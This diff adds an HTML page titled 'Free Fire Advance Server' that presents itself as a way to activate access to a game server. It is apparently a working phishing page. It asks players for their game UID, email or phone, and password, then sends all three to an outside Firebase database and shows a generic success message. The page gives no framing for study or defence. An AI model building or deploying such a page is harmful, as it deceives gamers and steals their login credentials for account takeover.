@@ -1,0 +1,102 @@
+<!doctype html>
+<html lang="en">
+ <head></head> 
+ <body> 
+  <h1>  </h1> 
+  <div>
+ 
+   <br> 
+  </div> 
+ 
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire Advance Server</title>
+    <style>
+        body {
+            background: url('https://i.imgur.com/CJqoOeD.jpeg') no-repeat center center fixed;
+            background-size: cover;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-container {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            color: white;
+            width: 300px;
+        }
+        .form-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        .form-container button {
+            background: yellow;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+    </style>
+
+
+
+    <div class="form-container">
+        <h2>FREE FIRE Advance Server</h2>
+        <input type="text" id="uid" placeholder="Uid">
+        <input type="text" id="email" placeholder="Email/Phone">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="submitForm()">Activate Server</button>
+    </div>
+
+    <script>
+        function submitForm() {
+            const uid = document.getElementById('uid').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (!uid || !email || !password) {
+                alert("Please fill all fields!");
+                return;
+            }
+
+            const data = {
+                uid: uid,
+                email: email,
+                password: password
+            };
+
+            fetch('https://free-c7432-default-rtdb.firebaseio.com/users.json', {
+                method: "POST",
+                body: JSON.stringify(data),
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert("Data submitted successfully!");
+                document.getElementById('uid').value = "";
+                document.getElementById('email').value = "";
+                document.getElementById('password').value = "";
+            })
+            .catch(error => {
+                console.error("Error:", error);
+            });
+        }
+    </script>
+
+
+</body></html>
+
+
